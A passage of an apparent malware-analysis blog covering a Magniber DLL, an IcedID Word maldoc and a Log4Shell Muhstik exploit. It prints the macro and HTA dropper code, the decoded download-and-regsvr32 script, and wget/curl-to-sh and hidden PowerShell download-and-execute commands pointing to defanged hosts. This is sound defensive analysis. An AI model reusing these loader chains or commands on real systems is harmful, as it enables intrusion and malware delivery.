&quot;eediwjus.dll&quot;# flags=0x0 ts=&quot;2021-12-29 10:55:45&quot; version=0.0 ord_base=1# nFuncs=1 nNames=1 ORD ENTRY_VA NAME 1 1f74 mhjpfzvittaThe export mhjpfzvitta() jives with what we expect coming from the EXE previously seen. This is probably our best entry point to examine the DLL.Getting Dirty In AssemblyI usually work with Ghidra, but Cutter seemed to have a better representation of the assembly for this binary.The entry point export mhjpfzvitta() is fairly brief.6: mhjpfzvitta (int64_t arg1);; arg int64_t arg1 @ rcx0x180001f74 call fcn.18000113f0x180001f79 retThe entry point immediately calls a function at offset 18000113f and returns. Once we go to look at the assembly for that function, we see quite a wild execution graph.Once entering the function, the sample contains loads of jmp instructions that cause execution to bounce around to various points of the binary. This makes it hard for analysts to follow execution, and eventually we see some more evidence of suspicious activity in decompiled code.undefined8 fcn.180001f8e(int64_t arg1){ syscall(); return 0x18;}Since the sample doesn’t have an import table, it’s relying on manual syscall calls like one to 0x18 for NtAllocateVirtualMemory. Avast saw this with Magniber in the past, alongside the jmp obfuscation.While I’m not yet skilled enough to tear much more out of the binary through static analysis, my eye was caught by one section of code that pushes 0x40 and 0x1000 to registers. These two values sometimes pop up when malware calls VirtualAlloc. 0x40 refers to PAGE_EXECUTE_READWRITE protection and 0x1000 refers to MEM_COMMIT. Since these values popped up in the sample, we can hypothesize that the sample may inject or unpack material into a memory space.How do we know it’s Magniber?I didn’t have luck getting Yara rules for Magniber to match this sample, so the best references I have right now are the tweet from @@JAMESWT_MHT and the blog post from Avast showing similar jmp obfuscation and syscall references.Thanks for reading!" }, { "title": "Analyzing an IcedID Loader Document", "url": "/analyzing-icedid-document/", "categories": "Malware", "tags": "icedid, malware, msword, mshta, regsvr32", "date": "2022-01-01 00:00:00 +0000", "snippet": "In this post I’m going to walk through an analysis of a malicious document that distributes and executes an IcedID DLL payload.The original document can be found on MalwareBazaar here: https://bazaar.abuse.ch/sample/ecd84fa8d836d5057149b2b3a048d75004ca1a1377fcf2f5e67374af3a1161a0/Analyzing the DocumentWe can start off by looking at the document properties with exiftool.remnux@remnux:~/cases/icedid$ exiftool maldoc.doc ExifTool Version Number : 12.30File Name : maldoc.docDirectory : .File Size : 78 KiBFile Modification Date/Time : 2022:01:01 00:52:52-05:00File Access Date/Time : 2021:12:31 20:06:54-05:00File Inode Change Date/Time : 2021:12:31 19:54:10-05:00File Permissions : -rw-r--r--File Type : DOCFile Type Extension : docMIME Type : application/mswordIdentification : Word 8.0Language Code : English (US)Doc Flags : Has picture, 1Table, ExtCharSystem : WindowsWord 97 : NoTitle : Subject : Author : Keywords : Comments : taTemplate : NormalLast Modified By : Пользователь WindowsSoftware : Microsoft Office WordCreate Date : 2021:12:27 11:02:00Modify Date : 2021:12:27 11:02:00Security : NoneCode Page : Windows CyrillicCategory : explorerManager : Company : ript.shBytes : 26624Char Count With Spaces : 16233App Version : 16.0000Scale Crop : NoLinks Up To Date : NoShared Doc : NoHyperlinks Changed : NoTitle Of Parts : Heading Pairs : Название, 1Comp Obj User Type Len : 32Comp Obj User Type : �������� Microsoft Word 97-2003Last Printed : 0000:00:00 00:00:00Revision Number : 2Total Edit Time : 0Words : 116Characters : 16118Pages : 1Paragraphs : 1Lines : 65We can see a few parts of the document properties are weird, like Company containing ript.sh. From here we can usually assume some form of a macro or exploit is involved, so we can use oledump.py to investigate macros first.remnux@remnux:~/cases/icedid$ oledump.py maldoc.doc 1: 114 &#39;\\x01CompObj&#39; 2: 4096 &#39;\\x05DocumentSummaryInformation&#39; 3: 4096 &#39;\\x05SummaryInformation&#39; 4: 7224 &#39;1Table&#39; 5: 26648 &#39;Data&#39; 6: 398 &#39;Macros/PROJECT&#39; 7: 56 &#39;Macros/PROJECTwm&#39; 8: M 2420 &#39;Macros/VBA/ThisDocument&#39; 9: 2896 &#39;Macros/VBA/_VBA_PROJECT&#39; 10: 1708 &#39;Macros/VBA/__SRP_0&#39; 11: 241 &#39;Macros/VBA/__SRP_1&#39; 12: 983 &#39;Macros/VBA/__SRP_2&#39; 13: 364 &#39;Macros/VBA/__SRP_3&#39; 14: 553 &#39;Macros/VBA/dir&#39; 15: M 1103 &#39;Macros/VBA/main&#39; 16: 19522 &#39;WordDocument&#39;The output from oledump.py indicates streams 8 and 15 contain macro content, so let’s dive into those. Using oledump.py -v -s 8 and -s 15 we can get the contents of the macros. I’ve annotated the macros with contents below:Attribute VB_Name = &quot;ThisDocument&quot;Attribute VB_Base = &quot;1Normal.ThisDocument&quot;Attribute VB_GlobalNameSpace = FalseAttribute VB_Creatable = FalseAttribute VB_PredeclaredId = TrueAttribute VB_Exposed = TrueAttribute VB_TemplateDerived = TrueAttribute VB_Customizable = True&#39;contents() finds contents of the document and removes all instances of s3xFunction contents() With ActiveDocument.Content superI7Center = .Find.Execute(FindText:=&quot;s3x&quot;, ReplaceWith:=&quot;&quot;, Replace:=2) End WithEnd Function&#39;cont1() returns the specified document property (which is visible with exiftool)Function cont1(i7ComputerMonitor) cont1 = ActiveDocument.BuiltInDocumentProperties(i7ComputerMonitor).Value contentsEnd Function&#39;srn1() runs &quot;CreateObject(&quot;wscript.shell&quot;).exec Explorer i7Gigabyte.hta&quot;Public Function srn1(mouseVideo) CreateObject(&quot;wsc&quot; + cont1(&quot;company&quot;) + &quot;ell&quot;).exec cont1(&quot;category&quot;) + &quot; &quot; + mouseVideoEnd FunctionSub Document_Open() hnyEnd Sub...Attribute VB_Name = &quot;main&quot;&#39;hny() saves the content of the document to i7Gigabyte.hta and executes the contents.Public Sub hny() processorI9 = Trim(&quot;i7Gigabyte.h&quot; &amp;amp; ThisDocument.cont1(&quot;comments&quot;)) ActiveDocument.SaveAs2 FileName:=processorI9, FileFormat:=2 ThisDocument.srn1 processorI9End SubThe VB macros use these document properties:Comments : taCategory : explorerCompany : ript.shFrom the macro content, we can expect a few things: i7Gigabyte.hta will get written to disk MS Word will execute explorer i7Gigabyte.hta i7Gigabyte.hta will contain HTML content and likely some JavaScriptTo get the document content, we can use oledump.py -s 16 and run strings against its output:remnux@remnux:~/cases/icedid$ oledump.py -d -s 16 maldoc.doc | stringsbjbj&amp;lt;s3xhs3xts3xms3xls3x&amp;gt;s3x&amp;lt;s3xbs3xos3xds3xys3x&amp;gt;s3x&amp;lt;s3xps3x s3xis3xds3x...We can copy and paste the text into its own file. To see what will execute, we can use Find/Replace in VSCode to see the final version.Analyzing the Stage 2 HTAI’ve gone ahead and prettified the HTA’s code below:&amp;lt;html&amp;gt; &amp;lt;body&amp;gt; &amp;lt;p id=&#39;processorRtx&#39; style=&#39;font-color: #000&#39;&amp;gt;eval&amp;lt;/p&amp;gt; &amp;lt;p id=&#39;rtxI7&#39; style=&#39;font-color: #000&#39;&amp;gt; fX17KWUoaGN0YWN9O2Vzb2xjLnh0Um9lZGlWZWxiYXQ7KTIgLCJncGouN0lldHliYWdpZ1xcY2lsYnVwXFxzcmVzdVxcOmMiKGVsaWZvdGV2YXMueHRSb2VkaVZlbGJhdDspeWRvYmVzbm9wc2VyLnJlcHVTcm9zc2Vjb3JQb2VkaXYoZXRpcncueHRSb2VkaVZlbGJhdDsxID0gZXB5dC54dFJvZWRpVmVsYmF0O25lcG8ueHRSb2VkaVZlbGJhdDspIm1hZXJ0cy5iZG9kYSIodGNlamJPWGV2aXRjQSB3ZW4gPSB4dFJvZWRpVmVsYmF0IHJhdnt5cnR7KTAwMiA9PSBzdXRhdHMucmVwdVNyb3NzZWNvclBvZWRpdihmaTspKGRuZXMucmVwdVNyb3NzZWNvclBvZWRpdjspZXNsYWYgLCIwYk85ZDN6QUpOZGlBeXg5alpPeldnT3QwMT1kaXMmcUVQNTh4QURpaHNMQWFQdDhYQmpDWWNqY1h3WnZkPWVnYXAmdnQxczdwV1ZSSEdMWUpmNmdyY0QwZHl2WVg9ZWdhcCY1Nm1ldVFhQkI4Vj1lZ2FwPzNpY2F2L0YxVXJyRVgxVUFGYlJMekFBeUcvVHhlV2FiaURpOGRlR3FhdWVCTkdsRmZEV2FjQXA5TmtGNy83NzJRRkd2RklQZ3BiNlZsdHhHaHVFYnNEdHpIT3l2ZnFWYVZwNWJZODZJY3d1clMvMDgyOTQvcDB4ZGVISVZrU0kvQkZTd25lYVVmelNlS2svVEZiSWVnUWNNZjJlNWg0Yjl4SDB4RWU0aE1xalMvN29lcm9rbmx5SzkxdTllTkRBTXBTQXJhQ2JuUUxUZUpLTGFBcmpRSWhBcS82eW5zVHBaNnZCWndYazlCTWZMSzB0QlNhSVluaTUvVmdSRDRvckppOUZPQkdqT3hERjg3YXZGVFc1UVM3ZXlDbGNkOEwvZWhyZi9tb2MuZ3Rzb29ibGV0YXAvLzpwdHRoIiAsIlRFRyIobmVwby5yZXB1U3Jvc3NlY29yUG9lZGl2OykicHR0aGxteC4ybG14c20iKHRjZWpiT1hldml0Y0Egd2VuID0gcmVwdVNyb3NzZWNvclBvZWRpdiByYXY=---OykiZ3BqLjdJZXR5YmFnaWdcXGNpbGJ1cFxcc3Jlc3VcXDpjIDIzcnZzZ2VyIihudXIuZXR5YmFnaUdlbGJhVHh0cjspInRjZWpib21ldHN5c2VsaWYuZ25pdHBpcmNzIih0Y2VqYk9YZXZpdGNBIHdlbiA9IGVsYmFUZXN1b003aSByYXY7KSJsbGVocy50cGlyY3N3Iih0Y2VqYk9YZXZpdGNBIHdlbiA9IGV0eWJhZ2lHZWxiYVR4dHIgcmF2 &amp;lt;/p&amp;gt; &amp;lt;p id=&#39;notebookGigabyteGigabyte&#39; style=&#39;font-color: #fff&#39;&amp;gt; ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/= &amp;lt;/p&amp;gt; &amp;lt;script language=&#39;javascript&#39;&amp;gt; function centerAsusSuper(i9I9Table){ return(new ActiveXObject(i9I9Table)); } function cardI9Processor(i9VideoMouse){ return(tableNotebook.getElementById(i9VideoMouse).innerHTML); } function i7ProcessorCard(processorAsus){ return(&#39;cha&#39; + processorAsus); } function tableI9I9(processorMonitorSuper){ var notebookProcessor = cardI9Processor(&#39;notebookGigabyteGigabyte&#39;) var videoSuper = &quot;&quot;; var superProcessorI9, cardKeyboard, computerComputerSuper; var notebookMouseComputer, gigabyteTableComputer, processorGigabyte, tableCenter; var cardRtxCard = 0; processorMonitorSuper = processorMonitorSuper.replace(/[^A-Za-z0-9\\+\\/\\=]/g, &quot;&quot;); while(cardRtxCard &amp;lt; processorMonitorSuper.length){ notebookMouseComputer = notebookProcessor.indexOf(processorMonitorSuper.charAt(cardRtxCard++)); gigabyteTableComputer = notebookProcessor.indexOf(processorMonitorSuper.charAt(cardRtxCard++)); processorGigabyte = notebookProcessor.indexOf(processorMonitorSuper.charAt(cardRtxCard++)); tableCenter = notebookProcessor.indexOf(processorMonitorSuper.charAt(cardRtxCard++)); superProcessorI9 = (notebookMouseComputer &amp;lt;&amp;lt; 2) | (gigabyteTableComputer &amp;gt;&amp;gt; 4); cardKeyboard = ((gigabyteTableComputer &amp;amp; 15) &amp;lt;&amp;lt; 4) | (processorGigabyte &amp;gt;&amp;gt; 2); computerComputerSuper = ((processorGigabyte &amp;amp; 3) &amp;lt;&amp;lt; 6) | tableCenter; videoSuper = videoSuper + String.fromCharCode(superProcessorI9); if(processorGigabyte != 64){ videoSuper = videoSuper + String.fromCharCode(cardKeyboard); } if(tableCenter != 64){ videoSuper = videoSuper + String.fromCharCode(computerComputerSuper); } } return(videoSuper); } function i7AsusVideo(i7Processor){ return i7Processor.split(&#39;&#39;).reverse().join(&#39;&#39;); } function monitorMonitorRtx(processorAsus){ return(i7AsusVideo(tableI9I9(processorAsus))); } function asusProcessorMonitor(processorAsus, centerNotebook){ return(processorAsus.split(centerNotebook)); } cardTableMonitor = window; tableNotebook = document; cardTableMonitor[&#39;moveTo&#39;](-101, -102); var tableRtx = cardI9Processor(&#39;rtxI7&#39;).split(&quot;---&quot;); var cardComputerMonitor = monitorMonitorRtx(tableRtx[0]); var rtxI7Super = monitorMonitorRtx(tableRtx[1]); &amp;lt;/script&amp;gt; &amp;lt;script language=&#39;javascript&#39;&amp;gt; function rtxVideo(processorProcessorVideo){ cardTableMonitor[cardI9Processor(&#39;processorRtx&#39;)](processorProcessorVideo); } &amp;lt;/script&amp;gt; &amp;lt;script language=&#39;vbscript&#39;&amp;gt; Call rtxVideo(cardComputerMonitor) Call rtxVideo(rtxI7Super) &amp;lt;/script&amp;gt; &amp;lt;script language=&#39;javascript&#39;&amp;gt; cardTableMonitor[&#39;close&#39;](); &amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;We can make a few hypotheses about the code: &amp;lt;&amp;lt; and &amp;gt;&amp;gt; and the string ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/= show the possible use of a rotation cipher eval is the JavaScript keyword to execute additional JavaScript code .split(&quot;---&quot;) and --- in the larger string above indicate the larger string will get split in two elementsAt the end of the document the scripting changes languages from JavaScript to VBscript but it doesn’t really make a difference in execution. The beautiful and handy thing about this stage is that it doesn’t use any Windows-specific scripting structures, which means we can easily use a NodeJS REPL to decode everything without having to manually decode the cipher. To do this, we can split the larger string manually and feed it into the monitorMonitorRtx() function.&amp;gt; string1 = &#39;fX17KWUoaGN0YWN9O2Vzb2xjLnh0Um9lZGlWZWxiYXQ7KTIgLCJncGouN0lldHliYWdpZ1xcY2lsYnVwXFxzcmVzdVxcOmMiKGVsaWZvdGV2YXMueHRSb2VkaVZlbGJhdDspeWRvYmVzbm9wc2VyLnJlcHVTcm9zc2Vjb3JQb2VkaXYoZXRpcncueHRSb2VkaVZlbGJhdDsxID0gZXB5dC54dFJvZWRpVmVsYmF0O25lcG8ueHRSb2VkaVZlbGJhdDspIm1hZXJ0cy5iZG9kYSIodGNlamJPWGV2aXRjQSB3ZW4gPSB4dFJvZWRpVmVsYmF0IHJhdnt5cnR7KTAwMiA9PSBzdXRhdHMucmVwdVNyb3NzZWNvclBvZWRpdihmaTspKGRuZXMucmVwdVNyb3NzZWNvclBvZWRpdjspZXNsYWYgLCIwYk85ZDN6QUpOZGlBeXg5alpPeldnT3QwMT1kaXMmcUVQNTh4QURpaHNMQWFQdDhYQmpDWWNqY1h3WnZkPWVnYXAmdnQxczdwV1ZSSEdMWUpmNmdyY0QwZHl2WVg9ZWdhcCY1Nm1ldVFhQkI4Vj1lZ2FwPzNpY2F2L0YxVXJyRVgxVUFGYlJMekFBeUcvVHhlV2FiaURpOGRlR3FhdWVCTkdsRmZEV2FjQXA5TmtGNy83NzJRRkd2RklQZ3BiNlZsdHhHaHVFYnNEdHpIT3l2ZnFWYVZwNWJZODZJY3d1clMvMDgyOTQvcDB4ZGVISVZrU0kvQkZTd25lYVVmelNlS2svVEZiSWVnUWNNZjJlNWg0Yjl4SDB4RWU0aE1xalMvN29lcm9rbmx5SzkxdTllTkRBTXBTQXJhQ2JuUUxUZUpLTGFBcmpRSWhBcS82eW5zVHBaNnZCWndYazlCTWZMSzB0QlNhSVluaTUvVmdSRDRvckppOUZPQkdqT3hERjg3YXZGVFc1UVM3ZXlDbGNkOEwvZWhyZi9tb2MuZ3Rzb29ibGV0YXAvLzpwdHRoIiAsIlRFRyIobmVwby5yZXB1U3Jvc3NlY29yUG9lZGl2OykicHR0aGxteC4ybG14c20iKHRjZWpiT1hldml0Y0Egd2VuID0gcmVwdVNyb3NzZWNvclBvZWRpdiByYXY=&#39;&amp;gt; monitorMonitorRtx(string1)&#39;var videoProcessorSuper = new ActiveXObject(&quot;msxml2.xmlhttp&quot;);videoProcessorSuper.open(&quot;GET&quot;, &quot;hxxp://patelboostg[.]com/frhe/L8dclCye7SQ5WTFva78FDxOjGBOF9iJro4DRgV/5inYIaSBt0KLfMB9kXwZBv6ZpTsny6/qAhIQjrAaLKJeTLQnbCarASpMADNe9u19Kylnkoreo7/SjqMh4eEx0Hx9b4h5e2fMcQgeIbFT/kKeSzfUaenwSFB/ISkVIHedx0p/49280/SruwcI68Yb5pVaVqfvyOHztDsbEuhGxtlV6bpgPIFvGFQ277/7FkN9pAcaWDfFlGNBeuaqGed8iDibaWexT/GyAAzLRbFAU1XErrU1F/vaci3?page=V8BBaQuem65&amp;amp;page=XYvyd0Dcrg6fJYLGHRVWp7s1tv&amp;amp;page=dvZwXcjcYCjBX8tPaALshiDAx85PEq&amp;amp;sid=10tOgWzOZj9xyAidNJAz3d9Ob0&quot;, false);videoProcessorSuper.send();if(videoProcessorSuper.status == 200){try{var tableVideoRtx = new ActiveXObject(&quot;adodb.stream&quot;);tableVideoRtx.open;tableVideoRtx.type = 1;tableVideoRtx.write(videoProcessorSuper.responsebody);tableVideoRtx.savetofile(&quot;c:\\\\\\\\users\\\\\\\\public\\\\\\\\gigabyteI7.jpg&quot;, 2);tableVideoRtx.close;}catch(e){}}&#39;&amp;gt; var string2 = &#39;OykiZ3BqLjdJZXR5YmFnaWdcXGNpbGJ1cFxcc3Jlc3VcXDpjIDIzcnZzZ2VyIihudXIuZXR5YmFnaUdlbGJhVHh0cjspInRjZWpib21ldHN5c2VsaWYuZ25pdHBpcmNzIih0Y2VqYk9YZXZpdGNBIHdlbiA9IGVsYmFUZXN1b003aSByYXY7KSJsbGVocy50cGlyY3N3Iih0Y2VqYk9YZXZpdGNBIHdlbiA9IGV0eWJhZ2lHZWxiYVR4dHIgcmF2&#39;&amp;gt; monitorMonitorRtx(string2)&#39;var rtxTableGigabyte = new ActiveXObject(&quot;wscript.shell&quot;);var i7MouseTable = new ActiveXObject(&quot;scripting.filesystemobject&quot;);rtxTableGigabyte.run(&quot;regsvr32 c:\\\\\\\\users\\\\\\\\public\\\\\\\\gigabyteI7.jpg&quot;);&#39;Piecing those components together we get this script that executes via an eval statement:var videoProcessorSuper = new ActiveXObject(&quot;msxml2.xmlhttp&quot;);videoProcessorSuper.open(&quot;GET&quot;, &quot;hxxp://patelboostg[.]com/frhe/L8dclCye7SQ5WTFva78FDxOjGBOF9iJro4DRgV/5inYIaSBt0KLfMB9kXwZBv6ZpTsny6/qAhIQjrAaLKJeTLQnbCarASpMADNe9u19Kylnkoreo7/SjqMh4eEx0Hx9b4h5e2fMcQgeIbFT/kKeSzfUaenwSFB/ISkVIHedx0p/49280/SruwcI68Yb5pVaVqfvyOHztDsbEuhGxtlV6bpgPIFvGFQ277/7FkN9pAcaWDfFlGNBeuaqGed8iDibaWexT/GyAAzLRbFAU1XErrU1F/vaci3?page=V8BBaQuem65&amp;amp;page=XYvyd0Dcrg6fJYLGHRVWp7s1tv&amp;amp;page=dvZwXcjcYCjBX8tPaALshiDAx85PEq&amp;amp;sid=10tOgWzOZj9xyAidNJAz3d9Ob0&quot;, false);videoProcessorSuper.send();if(videoProcessorSuper.status == 200){ try{ var tableVideoRtx = new ActiveXObject(&quot;adodb.stream&quot;); tableVideoRtx.open; tableVideoRtx.type = 1; tableVideoRtx.write(videoProcessorSuper.responsebody); tableVideoRtx.savetofile(&quot;c:\\\\\\\\users\\\\\\\\public\\\\\\\\gigabyteI7.jpg&quot;, 2); tableVideoRtx.close; } catch(e){ }}var rtxTableGigabyte = new ActiveXObject(&quot;wscript.shell&quot;);var i7MouseTable = new ActiveXObject(&quot;scripting.filesystemobject&quot;);rtxTableGigabyte.run(&quot;regsvr32 c:\\\\\\\\users\\\\\\\\public\\\\\\\\gigabyteI7.jpg&quot;);Some more hypotheses: Something (presumably a DLL) gets downloaded from patelboostg[.]com The something gets written to c:\\users\\public\\gigabyteI7.jpg The HTA document (executed by mshta.exe) will execute regsvr32 c:\\users\\public\\gigabyteI7.jpgAnalyzing the Downloaded DLLThe downloaded DLL has these properties:filepath: gigabyteI7.jpgmd5: 815d99185422a8a1f891f902824da431sha1: 0b33b6b89e805e180e6e1bb272bb66de6c9f99d0sha256: 317383e111b7d1c2e9b6743f7b71263bff669d2e47c3e1a7853e1e616d6b1317ssdeep: 3072:aiKU8Wb6WxbqCM8aSEFrsEdRBHS3XVJS3YMJ/Pu0DMLLcLGiDZxr:AUnlMMCrr9SnV0VLGi9dimphash: 00a5fbfb9a1df393796976ca031dea1erich: cb10e59fdfb53fda4e672326b51f6e56The import table hash (imphash) and rich header hash (rich) can help you find similar samples in VirusTotal or other services. When combining searches using both of those hash values you can discover samples with similar capabilities made in similar build environments when compared with this DLL sample.Looking at the DLL with pedump, we find some more data. First, the DLL exports:=== EXPORTS ===# module &quot;stub.dll&quot;# flags=0x0 ts=&quot;2106-02-07 06:28:15&quot; version=0.0 ord_base=1# nFuncs=3 nNames=3 ORD ENTRY_VA NAME 1 a84c DllGetClassObject 2 a814 DllRegisterServer 3 ab5c PluginInitThe export DllRegisterServer jives with what we can expect of the malware, it’s the DLL export used by regsvr32.exe. If we decide to continue analysis with Ghidra or another tool that’s an excellent entry point to start analysis. The export PluginInit is also interesting. I usually expect exports like DllRegisterServer, DllUnregisterServer, DllMain, ServiceMain, or others, and PluginInit isn’t one I commonly encounter. This would also be another excellent lead in Ghidra.Using manalyze we can also see some suspicious imports:[ SUSPICIOUS ] The PE contains functions most legitimate programs don&#39;t use. [!] The program may be hiding some of its imports: GetProcAddress LoadLibraryExW Functions which can be used for anti-debugging purposes: SwitchToThread Memory manipulation functions often used by packers: VirtualProtect VirtualAllocVirtualAlloc, VirtualProtect, and SwitchToThread might be fun breakpoints if we decide to get rowdy with a debugger.Confirming Hypotheses with a SandboxWe can dive deeper into static analysis using Ghidra and x64debug, but I wan to eventually go to bed tonight. So I’m going to consult sandbox reports from ANY.RUN and Tria.ge. https://app.any.run/tasks/0747e33b-70c5-4154-ae55-5111424b02ac/ https://tria.ge/211231-m85kasfchrLooking at those reports, we can confirm our hypotheses about process ancestry.The Tria.ge report suggests another data point, that this threat is classified as IcedID. Again, this jives with previous data from MalwareBazaar suggesting the original document was related to IcedID.How Do We Know It’s IcedID???One of the things that greatly bothers me about many intelligence reports/blog posts/etc. is that they often don’t spell out how they know the malware is related to a named threat. So I’m going to go the extra step to do that here.First, the export PluginInit has been documented with IcedID before: https://www.splunk.com/en_us/blog/security/detecting-icedid-could-it-be-a-trickbot-copycat.html https://blogs.vmware.com/security/2021/07/icedid-analysis-and-detection.html https://thedfirreport.com/2021/07/19/icedid-and-cobalt-strike-vs-antivirus/Next, we can dig into the Tria.ge report. The reports suggests it found evidence of IcedID based on this Suricata alert:alert http $HOME_NET any -&amp;gt; $EXTERNAL_NET any (msg:&quot;ET MALWARE Win32/IcedID Request Cookie&quot;; flow:established,to_server; http.method; content:&quot;GET&quot;; http.cookie; content:&quot;_gads=&quot;; depth:7; content:&quot;_gat=&quot;; distance:0; content:&quot;_ga=&quot;; distance:0; content:&quot;_u=&quot;; distance:0; content:&quot;_io=&quot;; distance:0; content:&quot;_gid=&quot;; distance:0; reference:url,sysopfb.github.io/malware,/icedid/2020/04/28/IcedIDs-updated-photoloader.html; reference:url,www.fireeye.com/blog/threat-research/2021/02/melting-unc2198-icedid-to-ransomware-operations.html; classtype:trojan-activity; sid:2032086; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2021_03_17, deployment Perimeter, former_category MALWARE, signature_severity Major, updated_at 2021_03_17;)Essentially, the rule hits on HTTP GET requests with cookies containing _gads=, _gat=, _ga=, _u=, _io=, and _gid= values. These fields are explained within the blog post mentioned in the rule https://sysopfb.github.io/malware,/icedid/2020/04/28/IcedIDs-updated-photoloader.html.If Suricata found criteria that hit that rule, we can confirm the alert using a PCAP from the sandbox report. We can toss this into Wireshark and follow the TCP stream that aligns with unencrypted HTTP traffic on port 80.Within that stream we can see the cookie values Suricata found:Cookie: __gads=2507181075:1:259392:73; _gat=10.0.15063.64; _ga=1.198354.1970169159.96; _u=4D484B4B48555949:41646D696E:34384630373343324432444138443743; __io=21_369956170_74428499_1628131376; _gid=B3BF3B3C3D65If the threat really is IcedID, we should be able to decode these cookie values using the method described in the Sysopfb blog post above. According to the post, the _u value can be decoded using unhexlify in Python. We can give that a shot here to see if it decodes properly:&amp;gt;&amp;gt;&amp;gt; import binascii&amp;gt;&amp;gt;&amp;gt; binascii.unhexlify(&#39;4D484B4B48555949&#39;)b&#39;MHKKHUYI&#39;&amp;gt;&amp;gt;&amp;gt; binascii.unhexlify(&#39;41646D696E&#39;)b&#39;Admin&#39;The first value decodes to what was presumably the sandbox VM’s hostname and the second value decodes to the affected username.The _gat value contains 10.0.15063.64. The Sysopfb blog post indicates that in IcedID this corresponds to the victim’s Windows version. This version we see in the cookie does correspond to a known Windows build, so that data overlaps.These cookie overlaps alongside PluginInit give me enough data points to assert with medium to high confidence we’re looking at IcedID.Thanks for joining in, and Happy New Year!!!" }, { "title": "Analyzing a Log4Shell log4j Exploit from Muhstik", "url": "/analyzing-log4shell-muhstik/", "categories": "Malware", "tags": "log4jshell, malware, java, powershell, muhstik", "date": "2021-12-12 00:00:00 +0000", "snippet": "In this post I set out to analyze a simple chunk of Log4Shell log4j exploit code to see how it works.Finding the ExploitI wasn’t running a honeypot or anything, I just figured I could rustle around VirusTotal and find one using this search:tag:java-bytecode positives:1+Out of the files I saw, I ended up settling on this simple one:https://www.virustotal.com/gui/file/2b5f04d15e459132a5935260746788db39b469ea46859c4a5bb8625f8a80bd41Triaging for IndicatorsIf you’re working an incident it helps to have some indicators you can feed over to the rest of your team to identify behaviors or other data. One of the easiest ways to find low-hanging indicators in malware is using the strings command.remnux@remnux:~/cases/muhstik$ strings Exploit.class &amp;lt;init&amp;gt;CodeLineNumberTable&amp;lt;clinit&amp;gt;StackMapTableSourceFileExploit.javajava/lang/String /bin/bashS(wget -qO - hxxp://18.228.7[.]109/.log/log || curl hxxp://18.228.7[.]109/.log/log) | shos.namepowershellhidden(new-object System.Net.WebClient).Downloadfile(&#39;hxxp://172.105.241[.]146:80/wp-content/themes/twentysixteen/s.cmd&#39;, &#39;s.cmd&#39;);start-process s.cmdjava/lang/Exceptioncom/knal/muhstik/Exploitjava/lang/Object[Ljava/lang/String;java/lang/SystemgetProperty&amp;amp;(Ljava/lang/String;)Ljava/lang/String;toLowerCase()Ljava/lang/String;startsWith(Ljava/lang/String;)Zjava/lang/RuntimegetRuntime()Ljava/lang/Runtime;exec(([Ljava/lang/String;)Ljava/lang/Process;java/lang/ProcesswaitForLjava/io/PrintStream;toStringjava/io/PrintStreamprintln(Ljava/lang/String;)VKeep in mind that strings doesn’t grab Unicode characters by default, so you’ll need to run a second pass using strings -eL. In this case, I found no additional strings.Useful indicators from this threat include: hxxp://18.228.7[.]109/.log/log hxxp://172.105.241[.]146:80/wp-content/themes/twentysixteen/s.cmd com/knal/muhstik/ExploitThe last string proves useful to find intelligence overlaps. The Muhstik botnet has used the strings knal and muhstik in parts of its exploitation in the past.Reversing to Java SourceReversing the Java bytecode in a class file back to source is relatively easy, and I recommend using JD-GUI for the job. Pretty much all of the work is done for you (assuming the code isn’t obfuscated) and you’ll get a clean view of the code.This code is a simple example of cross-platform exploit code.String[] arrayOfString = { &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;(wget -qO - hxxp://18.228.7[.]109/.log/log || curl hxxp://18.228.7[.]109/.log/log) | sh&quot; };if (System.getProperty(&quot;os.name&quot;).toLowerCase().startsWith(&quot;win&quot;)) arrayOfString = new String[] { &quot;powershell&quot;, &quot;-w&quot;, &quot;hidden&quot;, &quot;-c&quot;, &quot;(new-object System.Net.WebClient).Downloadfile(&#39;hxxp://172.105.241[.]146:80/wp-content/themes/twentysixteen/s.cmd&#39;, &#39;s.cmd&#39;);start-process s.cmd&quot; }; Runtime runtime = Runtime.getRuntime();Process process = runtime.exec(arrayOfString);process.waitFor();The code uses System.getProperty() to determine if the server is running Windows or not. If it is, the code executes PowerShell with commands to download s.cmd and then execute it. If the server isn’t running Windows, the code executes curl and/or wget commands depending on what is available on the exploited system.The actual shell commands are kicked off by Runtime.exec and then the code waits for the commands to complete." }, { "title": "Smarter, Not Harder: Getting Malware to Help You Analyze It", "url": "/smarter-not-harder-malware-analysis/", "categories": "Malware", "tags": "windows, malware, deobfuscation, powershell, .net", "date": "2021-09-05 00:00:00 +0000", "snippet": "When analyzing even non-advanced malware nowadays it’s common to find pretty heavy levels of obfuscation within samples. PowerShell and .NET malware for Windows can be obfuscated easily using various packers/crypters or script obfuscation tools. If you know how to manipulate the malware code, however, you can use the deobfuscation capabilities of malware to reveal unpacked samples.Newton’s Third Law (of Malware)If you’ve studied Physics you’ve likely run across Newton’s Third Law of Motion: “For every action, there is an equal and opposite reaction.” The same law can be applied to obfuscated malware. When at rest or during transmission, adversaries may encrypt or encode malicious code to avoid static signatures. During execution, though, the encoding or encryption must be removed so the code can successfully load and execute.To facilitate this process, adversaries commonly include algorithms within obfuscated code designed to remove the obfuscation at runtime. If you can focus on how the algorithm is called and used, you can use it for your own purposes!Safety First!This exercise in deobfuscation requires us to execute portions of code from malware. We’re not performing dynamic analysis, but there is the possibility that we might accidentally execute some malicious code. To protect against this possibility, use a virtual machine for analysis. Prior to analysis, remove any network connections and shared folders before taking a snapshot and beginning to work.During analysis we want to identify any code designed to interpret, invoke, or execute commands so we can comment them out. We only want to execute commands designed to manipulate data and write data to files.A Simple Example to StartAn excellent example of using the malware code against itself can be found with this sample: https://www.virustotal.com/gui/file/578f5dba1af809ee5b492582c38c5cf6e8bd1319fe91cc2cb0fb6066ca3c1eb9/. This sample leads to the execution of a second sample that is more complex which we can also work with.The original code for this sample appears similar to this:$1 = 